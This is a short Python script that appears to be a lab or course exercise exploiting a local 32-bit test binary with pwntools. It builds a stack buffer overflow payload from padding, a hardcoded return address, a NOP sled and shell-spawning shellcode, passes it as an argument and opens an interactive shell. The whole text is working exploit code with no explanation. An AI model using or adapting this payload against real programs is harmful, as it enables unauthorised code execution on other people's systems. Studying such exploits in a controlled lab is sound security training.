from pwn import *

path = './8_2_3_test'
context(os = 'linux', arch = 'i386')
elf = ELF(path)

shellcode=shellcraft.sh()
ret_addr=0xffffcd88

payload  = 'a' * 24
payload += p32(ret_addr)
payload += "\x90" * 20
payload += asm(shellcode)
payload += 'c' * 169

p=process(argv=[path,payload])

p.interactive()